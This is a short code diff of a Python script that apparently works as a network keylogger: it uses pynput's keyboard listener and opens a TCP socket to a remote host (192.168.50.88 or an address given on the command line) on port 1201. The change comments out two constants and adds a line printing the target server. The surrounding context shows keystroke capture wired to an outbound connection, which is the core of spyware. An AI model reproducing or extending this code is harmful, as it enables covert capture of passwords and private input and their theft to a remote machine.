@@ -6,10 +6,10 @@ import socket
 from pynput import keyboard
 
 
-HOST = '192.168.50.88'
+# HOST = '192.168.50.88'
 PORT = 1201
 BUFSIZE = 1024
-ADDR = (HOST, PORT)
+# ADDR = (HOST, PORT)
 
 
 def on_press(key):
@@ -39,6 +39,7 @@ if not sys.argv == sys.argv[0]:
     host = '{0}'.format(sys.argv[1])
 else:
     host = '192.168.50.88'
+print('target server{0} : {1}'.format(host, PORT))
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host, PORT))
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
